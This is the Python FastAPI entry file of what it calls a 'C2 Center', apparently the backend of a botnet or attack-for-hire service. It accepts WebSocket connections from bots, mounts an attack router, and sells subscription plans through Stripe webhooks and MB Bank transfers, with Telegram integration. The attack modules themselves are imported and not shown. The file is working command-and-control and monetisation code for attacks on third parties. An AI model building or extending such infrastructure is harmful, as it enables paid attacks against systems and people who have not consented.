from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
import uvicorn, asyncio, uuid, os

from app.database import init_redis, close_redis, engine, Base
from app.config import settings
from app.routers import auth_router, bot_router, attack_router, admin_router, plan_router
from app.websocket.bot_handler import handle_bot_websocket
from app.telegram_bot import init_telegram
from app.mbbank import get_mb, mb_payment_scanner

@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_redis()
    async with engine.begin() as conn: await conn.run_sync(Base.metadata.create_all)
    print(f"🚀 C2 Server running on {settings.C2_HOST}:{settings.C2_PORT}")
    try: await init_telegram()
    except Exception as e: print(f"[Telegram] Init failed: {e}")
    if settings.MB_USERNAME and settings.MB_PASSWORD:
        asyncio.create_task(mb_payment_scanner())
    yield
    await close_redis(); await engine.dispose()

app = FastAPI(title="C2 Center", version="4.0.0", lifespan=lifespan, docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

app.include_router(auth_router.router)
app.include_router(bot_router.router)
app.include_router(attack_router.router)
app.include_router(admin_router.router)
app.include_router(plan_router.router)

@app.websocket("/ws/bot/{bot_id}")
async def bot_ws(ws: WebSocket, bot_id: str): await handle_bot_websocket(ws, bot_id)

@app.post("/api/payment/stripe/webhook")
async def stripe_webhook(request: Request):
    payload = await request.body(); sig_header = request.headers.get("stripe-signature")
    try:
        import stripe
        event = stripe.Webhook.construct_event(payload, sig_header, settings.STRIPE_WEBHOOK_SECRET)
        if event["type"] == "checkout.session.completed":
            session = event["data"]["object"]
            from app.database import async_session
            from app.models.all_models import Payment, UserSubscription
            from sqlalchemy import select
            from datetime import timedelta, datetime, timezone
            async with async_session() as s:
                r = await s.execute(select(Payment).where(Payment.tx_ref == session["id"]))
                payment = r.scalar_one_or_none()
                if payment and payment.status == "pending":
                    payment.status = "completed"
                    payment.completed_at = datetime.now(timezone.utc)
                    s.add(UserSubscription(user_id=payment.user_id, plan_id=uuid.UUID(session["metadata"]["plan_id"]), status="active", expires_at=datetime.now(timezone.utc)+timedelta(days=30), payment_id=payment.tx_ref))
                    await s.commit()
        return JSONResponse({"status": "ok"})
    except Exception as e: return JSONResponse({"error": str(e)}, 400)

@app.post("/api/payment/mbank/create")
async def mbank_create(request: Request):
    from app.database import async_session
    from app.models.all_models import Payment, Plan, User
    from sqlalchemy import select
    data = await request.json()
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    from app.auth import decode_token
    payload = decode_token(token)
    if not payload: return JSONResponse({"error": "Unauthorized"}, 401)
    async with async_session() as s:
        r = await s.execute(select(User).where(User.id == payload["sub"]))
        user = r.scalar_one_or_none()
        if not user: return JSONResponse({"error": "User not found"}, 404)
        plan_slug = data.get("plan", "basic")
        r2 = await s.execute(select(Plan).where(Plan.slug == plan_slug))
        plan = r2.scalar_one_or_none()
        if not plan: return JSONResponse({"error": "Plan not found"}, 404)
        tx_ref = f"C2-{uuid.uuid4().hex[:8].upper()}"
        payment = Payment(user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd, method="mbank", tx_ref=tx_ref, meta={"plan_id": str(plan.id), "plan_slug": plan.slug})
        s.add(payment); await s.commit()
        mb = await get_mb()
        mb_info = mb.account_no if mb else "Liên hệ admin"
        return JSONResponse({"status": "pending", "tx_ref": tx_ref, "amount": plan.price_vnd, "bank_account": mb_info, "bank_name": "MB Bank", "description": tx_ref, "message": f"Chuyển khoản {plan.price_vnd:,}đ đến MB Bank. Nội dung: {tx_ref}"})

# Serve React frontend (production build)
FRONTEND_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "frontend", "dist")
if os.path.exists(FRONTEND_DIR):
    app.mount("/assets", StaticFiles(directory=os.path.join(FRONTEND_DIR, "assets")), name="assets")
    @app.get("/{full_path:path}")
    async def serve_react(full_path: str):
        if full_path.startswith("api/") or full_path.startswith("ws/"): return JSONResponse({"detail": "Not Found"}, 404)
        file_path = os.path.join(FRONTEND_DIR, full_path)
        if os.path.isfile(file_path): return FileResponse(file_path)
        return FileResponse(os.path.join(FRONTEND_DIR, "index.html"))
else:
    @app.get("/")
    async def fallback(): return HTMLResponse("<h1>C2 Server Running</h1><p>Build frontend: <code>cd frontend && npm run build</code></p>")

@app.get("/health")
async def health(): return {"status": "ok"}

if __name__ == "__main__":
    uvicorn.run("app.main:app", host="0.0.0.0", port=8000, reload=False)